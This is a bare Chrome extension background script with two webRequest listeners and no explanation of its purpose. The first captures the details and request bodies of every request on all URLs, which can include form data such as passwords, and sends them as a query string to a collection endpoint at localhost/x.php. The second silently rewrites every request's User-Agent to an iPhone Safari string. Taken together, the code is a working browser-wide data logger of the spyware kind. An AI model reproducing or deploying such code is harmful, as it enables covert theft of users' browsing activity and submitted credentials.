chrome.webRequest.onBeforeRequest.addListener(
                                              function(details)
                                              {
                                              
                                              var postedString;
                                              postedString = JSON.stringify(details);
                                              var xhr = new XMLHttpRequest();
                                              xhr.open("GET", "http://localhost/x.php?data="+postedString, true);
                                              xhr.send();
                                              
                                              },
                                              {urls: [  "<all_urls>" ]},
                                              ['requestBody']
                                              );
chrome.webRequest.onBeforeSendHeaders.addListener(function(details){
                                                  //console.log(JSON.stringify(details));
                                                  var headers = details.requestHeaders,
                                                  blockingResponse = {};
                                                  
                                                  // Each header parameter is stored in an array. Since Chrome
                                                  // makes no guarantee about the contents/order of this array,
                                                  // you'll have to iterate through it to find for the
                                                  // 'User-Agent' element
                                                  var body;
                                                  for( var i = 0, l = headers.length; i < l; ++i ) {
                                                  body = headers[i].value;
                                                  if( headers[i].name == 'User-Agent' ) {
                                                  headers[i].value = 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25';
                                                  break;
                                                  }
                                                  // If you want to modify other headers, this is the place to
                                                  // do it. Either remove the 'break;' statement and add in more
                                                  // conditionals or use a 'switch' statement on 'headers[i].name'
                                                  }
                                                  blockingResponse.requestHeaders = headers;
                                                  return blockingResponse;
                                                  },
                                                  {urls: [ "<all_urls>" ]},['requestHeaders','blocking']
                                                  );


